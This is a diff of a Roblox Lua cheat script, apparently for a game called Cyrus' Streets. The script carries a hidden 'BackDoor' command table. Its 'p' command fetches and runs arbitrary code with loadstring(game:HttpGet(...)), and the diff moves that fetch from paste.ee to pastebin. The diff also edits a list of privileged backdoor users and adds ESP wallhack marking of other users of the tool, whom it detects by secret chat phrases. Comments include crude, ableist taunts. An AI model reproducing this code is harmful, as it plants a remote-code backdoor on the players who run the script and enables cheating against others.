@@ -181,7 +181,7 @@ local BackDoorTableCommands = {
 		['Levels'] = {[4] = true;}
 	};
 	['p'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://paste.ee/r/"..Content))() end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
 		['Levels'] = {[3] = true;[4] = true;}
 	}
 }
@@ -206,16 +206,6 @@ local BackDoorTablePlayers = {
 		['Name'] = "!fishgang Karma (Head-Admin)";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(153,0,153);
-	};
-	[114164798] = {
-		['Name'] = "!fishgang Slays (O YES CMERE I CAN SMELL YA)"; -- AAAAAAAAAAAAAAAAAAAA Oh yeah try and run. I'm coming for ya hooya AAAAAAAAA ooh im coming for ya hoo oh yea hahaha
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(63,0,0);
-	};
-	[117074493] = {
-		['Name'] = "!fishgang Slays Alt (Not Slays Account just borrowed)(Don't Kill)"; -- AAAAAAAAAAAAAAAAAAAA Oh yeah try and run. I'm coming for ya hooya AAAAAAAAA ooh im coming for ya hoo oh yea hahaha
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(89,89,89);
 	};
 	[105183043] = {
 		['Name'] = "Drpoppa creator";
@@ -261,7 +251,22 @@ local BackDoorTablePlayers = {
 		['Name'] = "35 dollar donator";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(0,120,70)
-	}
+	};
+	[114164798] = {
+		['Name'] = "!fishgang Slays (O YES CMERE I CAN SMELL YA)"; 
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(63,0,0);
+	}; -- slays I have removed your autism I gained hepatitis Z from it
+	[117074493] = {
+		['Name'] = "!fishgang Slays Alt (Not Slays Account just borrowed)(Don't Kill)"; 
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(89,89,89);
+	};
+	[6289688] = {
+		['Name'] = "1337 hax0r";
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(144,0,0);
+	};
 }
 
 local SettingsTable = {
@@ -629,13 +634,6 @@ local function BackdoorCheck(Player,Chat)
 	end 
 end
 
-local function IsAUser(Player,Chat)
-	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
-		AdminUserTable[Player] = true
-		return true 
-	end
-end
-
 local function ColourifyGuns(GunTable,Colour)
 	for ToolIndex,Tool in pairs(GunTable:GetChildren()) do
 		if Tool:IsA'Tool' and Tool:FindFirstChild'Fire' then  
@@ -804,6 +802,16 @@ local function Esp(Part,Name,Colour)
 			TextLabel.Text = Name
 		end
 	end 
+end
+
+local function IsAUser(Player,Chat)
+	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
+		AdminUserTable[Player] = true
+		if BackDoorTablePlayers[LP.UserId] then 
+			Esp(Player.Character.Head,Player.Name)
+		end 
+		return true 
+	end
 end
 
 local function ShowOrHideEsp(Table,Bool,Player)
